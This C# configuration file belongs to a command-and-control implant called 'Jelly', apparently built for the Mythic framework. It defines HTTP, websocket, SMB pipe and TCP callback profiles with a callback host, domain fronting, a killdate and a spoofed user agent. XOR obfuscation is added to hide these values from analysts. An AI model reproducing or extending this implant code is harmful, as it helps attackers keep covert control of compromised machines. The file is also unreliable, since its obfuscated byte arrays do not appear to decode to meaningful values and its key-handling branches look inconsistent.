#define C2PROFILE_NAME_UPPER

//#define LOCAL_BUILD

#if LOCAL_BUILD
//#define HTTP
//#define WEBSOCKET
//#define TCP
//#define SMB
#endif

#if HTTP
using HttpTransport;
#endif
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using Interop.Structs.Structs;
using PSKCryptography;
using Interop.Serializers;
#if WEBSOCKET
using WebsocketTransport;
#endif
#if SMB
using NamedPipeTransport;
#endif
#if TCP
using TcpTransport;
#endif
namespace Jelly
{
    public static class Config
    {
        // XOR key for string obfuscation (change this to a random value)
        private static readonly byte[] _xorKey = new byte[] { 0x42, 0x7C, 0x9E, 0x3F, 0xA1, 0x5D, 0xC8, 0x12 };

        // Helper method to XOR strings (simple obfuscation visible in dnSpy but harder to extract)
        private static string UnobfuscateString(byte[] obfuscatedBytes)
        {
            byte[] result = new byte[obfuscatedBytes.Length];
            for (int i = 0; i < obfuscatedBytes.Length; i++)
            {
                result[i] = (byte)(obfuscatedBytes[i] ^ _xorKey[i % _xorKey.Length]);
            }
            return Encoding.UTF8.GetString(result);
        }
        public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()
        {
#if HTTP
            { "http", new C2ProfileData()
                {
                    TC2Profile = typeof(HttpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "callback_interval", "1" },
                        { "callback_jitter", "0" },
                        { "callback_port", "80" },
                        { "callback_host", "http://192.168.53.1" },
                        { "post_uri", "data" },
                        { "encrypted_exchange_check", "T" },
                        { "proxy_host", "" },
                        { "proxy_port", "" },
                        { "proxy_user", "" },
                        { "proxy_pass", "" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Jelly-Refactor" },
#else
                        { "callback_interval", UnobfuscateString(new byte[] { 73, 85, 76, 27, 29 }) },
                        { "callback_jitter", UnobfuscateString(new byte[] { 73, 85, 76 }) },
                        { "callback_port", UnobfuscateString(new byte[] { 73, 85, 76, 81 }) },
                        { "callback_host", UnobfuscateString(new byte[] { 73, 85, 76, 90, 68, 29, 67, 29, 71, 82, 67, 18, 26, 29, 26, 88, 29, 88 }) },
                        { "post_uri", UnobfuscateString(new byte[] { 68, 77, 88, 77 }) },
                        { "encrypted_exchange_check", UnobfuscateString(new byte[] { 88, 76, 85, 72 }) },
                        { "proxy_host", UnobfuscateString(new byte[] {}) },
                        { "proxy_port", UnobfuscateString(new byte[] {}) },
                        { "proxy_user", UnobfuscateString(new byte[] {}) },
                        { "proxy_pass", UnobfuscateString(new byte[] {}) },
                        { "killdate", UnobfuscateString(new byte[] { 81, 71, 71, 85, 14, 73, 73, 14, 81, 81 }) },
                        { "User-Agent", UnobfuscateString(new byte[] { 77, 71, 91, 73, 77, 84, 14, 30, 27, 18, 14, 29, 83, 77, 68, 85, 80, 86, 84, 88, 18, 14, 83, 71, 77, 80, 86, 80, 88, 14, 26, 18, 14, 29, 76, 73, 71, 85, 80, 88, 14, 83, 69, 18, 14, 26, 89, 14, 73, 73, 18, 18, 14, 77, 73, 80, 72, 86, 84, 14, 26, 18, 14, 26, 89, 14, 73, 73, 18 }) }
#endif
                    }
                }
            },
#endif
#if WEBSOCKET
            { "websocket", new C2ProfileData()
                {
                    TC2Profile = typeof(WebsocketProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "tasking_type", "Push" },
                        { "callback_interval", "5" },
                        { "callback_jitter", "0" },
                        { "callback_port", "8081" },
                        { "callback_host", "ws://mythic" },
                        { "ENDPOINT_REPLACE", "socket" },
                        { "encrypted_exchange_check", "T" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Jelly-Refactor" },
#else
                        { "tasking_type", UnobfuscateString(new byte[] { 82, 85, 86, 88 })},
                        { "callback_interval", UnobfuscateString(new byte[] { 73, 85, 76, 27, 29 }) },
                        { "callback_jitter", UnobfuscateString(new byte[] { 73, 85, 76 }) },
                        { "callback_port", UnobfuscateString(new byte[] { 73, 85, 76, 81 }) },
                        { "callback_host", UnobfuscateString(new byte[] { 73, 85, 76, 90, 68, 29, 67, 29, 71, 82, 67, 18, 26, 29, 26, 88, 29, 88 }) },
                        { "ENDPOINT_REPLACE", UnobfuscateString(new byte[] { 86, 71, 72, 76, 72, 88 }) },
                        { "encrypted_exchange_check", UnobfuscateString(new byte[] { 88, 76, 85, 72 }) },
                        { "domain_front", UnobfuscateString(new byte[] { 68, 71, 77, 77, 77, 73, 85, 14, 85, 76, 71, 85, 88 }) },
                        { "USER_AGENT", UnobfuscateString(new byte[] { 77, 71, 91, 73, 77, 84, 14, 30, 27, 18, 14, 83, 77, 68, 85, 80, 86, 84, 88 }) },
                        { "killdate", UnobfuscateString(new byte[] { 81, 71, 71, 85, 14, 73, 73, 14, 81, 81 }) }
#endif
                    }
                }
            },
#endif
#if SMB
            { "smb", new C2ProfileData()
                {
                    TC2Profile = typeof(NamedPipeProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "pipename", "h20iexte-2l1t-mmfu-ipjh-6ofmobkaruq8" },
                        { "encrypted_exchange_check", "true" },
#else
                        { "pipename", UnobfuscateString(new byte[] { 72, 81, 18, 72, 73, 76, 88, 72, 14, 81, 79, 73, 88, 14, 77, 77, 85, 72, 14, 73, 80, 85, 72, 14, 26, 71, 85, 86, 67, 91 }) },
                        { "encrypted_exchange_check", UnobfuscateString(new byte[] { 88, 76, 85, 72 }) }
#endif
                    }
                }
            },
#elif TCP
            { "tcp", new C2ProfileData()
                {
                    TC2Profile = typeof(TcpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "port", "40000" },
                        { "encrypted_exchange_check", "true" },
#else
                        { "port", UnobfuscateString(new byte[] { 73, 85, 76, 81, 71, 71 }) },
                        { "encrypted_exchange_check", UnobfuscateString(new byte[] { 88, 76, 85, 72 }) }
#endif
                    }
                }
            }
#endif
        };


        public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
#if LOCAL_BUILD
#if HTTP
        public static string StagingRSAPrivateKey = UnobfuscateString(new byte[] { 67, 79, 85, 85, 94, 80, 77, 67, 14, 70, 88, 88, 88, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29 });
#elif WEBSOCKET
        public static string StagingRSAPrivateKey = UnobfuscateString(new byte[] { 73, 79, 85, 85, 94, 80, 77, 67, 14, 70, 88, 88, 88, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29 });
#elif SMB
        public static string StagingRSAPrivateKey = UnobfuscateString(new byte[] { 77, 79, 85, 85, 94, 80, 77, 67, 14, 70, 88, 88, 88, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29 });
#elif TCP
        public static string StagingRSAPrivateKey = UnobfuscateString(new byte[] { 84, 79, 85, 85, 94, 80, 77, 67, 14, 70, 88, 88, 88, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29, 29 });
#endif
#if HTTP
        public static string PayloadUUID = UnobfuscateString(new byte[] { 82, 85, 84, 80, 14, 81, 85, 68, 14, 73, 85, 83, 29, 14, 67, 71, 90, 67, 71, 81, 14, 73, 85, 83, 29, 14, 77, 72, 81, 77, 14, 67, 71, 90, 67, 71, 81 });
#elif WEBSOCKET
        public static string PayloadUUID = UnobfuscateString(new byte[] { 88, 85, 84, 80, 14, 81, 85, 68, 14, 73, 85, 83, 29, 14, 67, 71, 90, 67, 71, 81, 14, 73, 85, 83, 29, 14, 77, 72, 81, 77, 14, 67, 71, 90, 67, 71, 81 });
#elif SMB
        public static string PayloadUUID = UnobfuscateString(new byte[] { 89, 85, 84, 80, 14, 81, 85, 68, 14, 73, 85, 83, 29, 14, 67, 71, 90, 67, 71, 81, 14, 73, 85, 83, 29, 14, 77, 72, 81, 77, 14, 67, 71, 90, 67, 71, 81 });
#elif TCP
        public static string PayloadUUID = UnobfuscateString(new byte[] { 81, 85, 84, 80, 14, 81, 85, 68, 14, 73, 85, 83, 29, 14, 67, 71, 90, 67, 71, 81, 14, 73, 85, 83, 29, 14, 77, 72, 81, 77, 14, 67, 71, 90, 67, 71, 81 });
#endif
#else
        // TODO: Make the AES key a config option specific to each profile
        public static string StagingRSAPrivateKey = "AESPSK_here";
        public static string PayloadUUID = "payload_uuid_here";
#endif
    }
}
